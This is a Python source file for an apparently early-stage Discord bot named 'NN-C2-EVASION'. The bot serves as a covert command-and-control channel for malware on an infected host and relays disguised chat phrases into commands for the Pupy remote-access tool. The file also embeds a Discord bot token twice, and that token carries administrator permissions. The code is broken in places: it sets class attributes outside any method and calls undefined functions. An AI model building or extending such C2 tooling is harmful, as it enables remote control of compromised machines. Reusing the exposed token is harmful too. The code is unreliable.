"""
This program will act as a Discord bot to read and write information to the discord channel on the infected host.
Client ID: 497092391811940362
Bot name: NN-C2-EVASION
Bot token: NDk3MDkyMzkxODExOTQwMzYy.DpaJOw.ZTOGEIVJfuYPKs4cp3lk71L0T_c
Permissions integer: 8
"""

import asyncio
import aiohttp
import json, time
from discord import Game
from discord.ext.commands import Bot
from pupylib.PupyModule import config, PupyArgumentParser, PupyModule

BOT_PREFIX = ("?", "!")


TOKEN = "NDk3MDkyMzkxODExOTQwMzYy.DpaJOw.ZTOGEIVJfuYPKs4cp3lk71L0T_c"  # Get at discordapp.com/developers/applications/me

client = Bot(command_prefix=BOT_PREFIX)


class MalwareReceiver():
    self.client = Bot(command_prefix=BOT_PREFIX)
    self.instructor_available = False
    self.active = False
    self.instruction_set = None
    self.is_blocked = False
    self.messageQueueLength = len(self.client.messages)
    self.instructionSetAliases = {
        "oy mate" : "pingback",
        "pls respond" : "pingback",
        "you wanna go mate?" : "pingback",
        "good to hear from you!" : "pingback",
        "hi there! :)" : "pingback"
    }
    self.instructionSetPupy = {"pingback" : "pwd"}

    async def on_ready(self):
        print('Logged in as')
        print(client.user.name + "\n" + client.user.id + "\n--------")

    async def check_instructor_availability(self):
        """
        Sends a message to the discord channel. Based on the response, evaluate whether the instructor is available.
        """
        print(self.instructor_available)

    async def heartbeat(self):
        """
        Sends a heartbeat message to the subject channel.
        """
        print(self.active)

    async def check_if_new_messages(self):
        return len(self.client.messages) > 0


    """
    These below two methods could possibly exist in a feedback loop.
    """
    async def await_instruction_set(self):
        """
        Let the instructor know that the malware is awaiting further instructions.
        """
        active = True
        while active:
            time.sleep(0.5)
            while len(self.client.messages) != 0:
                message = self.client.messages.pop()
                if message in self.instructionSetAliases:
                    execute_instruction_set(self.instructionSetAliases[message])

            self.check_if_blocked()
        print("Waiting for instructions ...")

    async def execute_instruction_set(self, instruction):
        """
        Executes the instructions received and generates report and feedback for the control server.
        Must enable the pupy client prior to running the "remote" command.
        """
        if instruction == "pwd":
            instructionObj = pwd(None)
            output = instructionObj.run()
            if output != None:
                self.check_if_blocked()
                self.generate_report("pwd")
            self.check_if_blocked()
        print()

    async def check_if_blocked(self):
        print()
